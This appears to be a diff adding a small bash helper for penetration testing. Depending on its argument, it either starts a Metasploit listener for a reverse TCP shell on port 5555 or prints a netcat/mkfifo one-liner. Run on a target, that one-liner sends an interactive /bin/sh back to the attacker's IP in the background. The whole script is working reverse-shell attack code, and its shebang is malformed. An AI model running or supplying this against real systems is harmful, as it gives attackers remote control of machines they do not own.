@@ -1,0 +1,10 @@
+#/bin/bash
+
+LHOST=$(getip)
+
+if [ -z "$1" ]
+then
+   msfconsole -qx "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set lhost $LHOST; set lport 5555; set ExitOnSession false; run -j"
+else
+   echo " nohup -- \$(rm -f /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc $LHOST 5555 >/tmp/g) &"
+fi
